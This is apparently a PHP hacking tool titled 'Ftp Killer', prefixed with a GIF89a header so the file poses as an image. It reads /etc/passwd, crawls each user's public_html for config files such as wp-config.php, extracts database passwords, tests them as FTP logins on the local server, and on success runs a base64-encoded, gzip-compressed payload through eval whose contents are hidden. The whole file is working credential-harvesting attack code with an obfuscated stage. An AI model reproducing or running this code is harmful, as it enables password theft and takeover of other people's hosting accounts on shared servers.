GIF89a????????!?????,???????D?;?<HTML><HEAD><TITLE>Ftp Killer By FaKoMasT3r & DeVIL^T3aM</TITLE></HEAD><?php
/*
Brainfuck
Edited by Midnightcr3w
(c) http://p-range.info
*/
echo '<html><head>
<style type="text/css">
<!--
}
a:link {
	color: #CCFF00;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
	color: #00FF00;
}
a:active {
	text-decoration: none;
}
-->
</style>
<title>FakoMasT3r</title></head><body bgcolor="#333333">';
($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
set_time_limit(0);
###################
@$passwd = fopen('/etc/passwd','r');
if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
$pub = array();
$users = array();
$conf = array();
$i = 0;
while(!feof($passwd))
{
	$str = fgets($passwd);
		if ($i > 35)
		{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
			{
				if (is_readable($dirz))
				{
					array_push($users,$username);
					array_push($pub,$dirz);
				}
			}
  		}
	$i++;
}
###################
echo '<center><span style="font-family: Georgia;font-size: 14px;color: #00FF99;">Midnightcr3w cPanel BruteForce Recode by FakoMasT3r</span><br><br><textarea cols="100" rows="20" style="background-color:#000000; color:#00FF00">';
echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
echo "[+] Founded ".sizeof($pub)." readable public_html directories\n";
echo "[~] Searching for passwords in config files...\n\n";
foreach ($users as $user)
{
	$path = "/home/$user/public_html/";
	read_dir($path,$user);
}
echo "\n[+] Done\n";
function read_dir($path,$username)
{
	if ($handle = opendir($path))
	{
		while (false !== ($file = readdir($handle)))
		{
			$fpath = "$path$file";
			if (($file != '.') and ($file != '..'))
			{
				if (is_readable($fpath))
				{
					$dr = $fpath."/";
					if (is_dir($dr))
					{
						read_dir($dr,$username);
					}
					else
					{
                         if (
                             ($file=='config.php')
                         or ($file=='config.inc.php')
                         or ($file=='conf.php')
                         or ($file=='settings.php')
                         or ($file=='configuration.php')
             or ($file=='wp_config.php')
             or ($file=='wp-config.php')
             or ($file=='inc.php')
                         or ($file=='setup.php')
                         or ($file=='dbconf.php')
                         or ($file=='dbconfig.php')
                         or ($file=='db.inc.php')
                         or ($file=='dbconnect.php')
                         or ($file=='connect.php')
                         or ($file=='common.php')
                         or ($file=='config_global.php')
                         or ($file=='db.php')
                         or ($file=='connect.inc.php')
             or ($file=='configure.php')
             or ($file=='conn.php')
             or ($file=='connection.php')
             or ($file=='connect.inc.php')
             or ($file=='database.php')
             or ($file=='dbconf.php')
             or ($file=='dbase.php')
                         or ($file=='e107_config.php')
                         or ($file=='dbconnect.inc.php'))
                        {
							$pass = get_pass($fpath);
							if ($pass != '')
							{
								echo "[+] $fpath\n$pass\n";
								ftp_check($username,$pass);
							}
						}
					}
				}
			}
		}
	}
}
function get_pass($link)
{
	@$config = fopen($link,'r');
	while(!feof($config))
	{
		$line = fgets($config);
		if (strstr($line,'pass')
		or strstr($line,'pwd')
		or strstr($line,'db_pass')
		or strstr($line,'dbpass')
		or strstr($line,'passwd'))
		{
			if (strrpos($line,'"'))
			{
				preg_match("/(.*)[^=]\"(.*)\"/",$line,$pass);
				$pass = str_replace("]=\"","",$pass);
			}

			else
				preg_match("/(.*)[^=]\'(.*)\'/",$line,$pass);
				$pass = str_replace("]='","",$pass);
			return $pass[2];
		}
	}
}
function ftp_check($login,$pass)
{
	@$ftp = ftp_connect('127.0.0.1');
	if ($ftp)
	{
		@$res = ftp_login($ftp,$login,$pass);
		if ($res)
		{
			echo '[FTP] '.$login.':'.$pass."  Success !\n\n";

eval(gzinflate(base64_decode('rVPRTtswFH2PlH/woki0Uqhw+oLomJimou5hWtSUPcBQ5TouDSS+np0I2LQP2l/ia6egofQtzYPt
43POvb2+NwziAmpWSnJO4nU+X/6YL2+OFqtVtl58z1dHt7MwiFVK7XVK/T7Ffer3J6fuZBc8c3+5
NcAfQAk56rwTVCWx0FqCW0yjE3oy7jT0kIYe1vjAvSp71a/Dr9yOPrg8x2HwJ2b0PJprDTqa/Q0D
URmxR/OWc2FMNNvyCowYeQ2y3jyo90h7PdJ+D/rOwybrXaa9LtN+F1R5H3wFYx8vCoPjoX4/ZRh8
UUyKilypgjWCfJVbIDdkKTgUgmyeyTdmHtY1uyt5yeQ1uSWoGTSBBZiGnJHuXRG5MkIjUsGdBzJm
DALKroPH/2yrrhqSgW7cn8vzhY3ljrZBELlcZW9IigjPXNFewengWf2zs0bp/+X/bcM9Ci0KfJil
bZENk0XZXA8cPMLJa8BOXfSrZbJp64nSpbS9efHMdgATDrXjaMFLhbR72MkJVxt4escw7eZe8AY5
Xcmw2ibv2s1xdoIVQhvkXGqoz0jr7j5K8WguuDr2x0lpO/MTCmyXVCObX7J3T3Awkr3P+JXi0jvI
egE=')));

			echo '[SSH] Port'   .':' .$a1. "  !\n\n";
			echo '[FTP] Port'   .':' .$a2. "  !\n\n";
			echo '[cPanel] Port' .':' .$a3. "  !\n\n";

		}
		else ftp_quit($ftp);
	}
}
echo '</textarea><br><br></center><center><span style="font-family: Georgia;font-size: 14px;color: #00FF99;">| visit <a href="http://www.midnightcr3w.net">www.midnightcr3w.net</a> |</span></center></body></html>';
?>